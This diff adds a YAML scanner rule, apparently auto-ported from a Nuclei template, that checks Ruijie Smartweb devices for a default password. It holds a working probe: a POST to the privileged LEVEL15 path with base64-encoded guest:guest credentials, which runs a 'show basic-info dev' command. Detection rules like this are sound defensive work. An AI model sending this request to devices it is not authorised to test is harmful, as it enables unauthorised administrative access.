@@ -1,0 +1,35 @@
+schema_version: 1
+id: "cortex.community:cnvd-2020-56167"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Ruijie Smartweb - Default Password"
+  description: "Ruijie Smartweb contains a vulnerability via the default password. An attacker can successfully bypass entering required credentials, thus possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.cnvd.org.cn/flaw/show/CNVD-2020-56167"
+    - "https://securityforeveryone.com/tools/ruijie-smartweb-default-password-scanner"
+  tags: ["cnvd", "cnvd2020", "ruijie", "default-login", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Low"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request:
+      method: "POST"
+      path: "/WEB_VMS/LEVEL15/"
+      headers: { "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=" }
+      body: "command=show basic-info dev&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "Level was: LEVEL15" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "/WEB_VMS/LEVEL15/" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
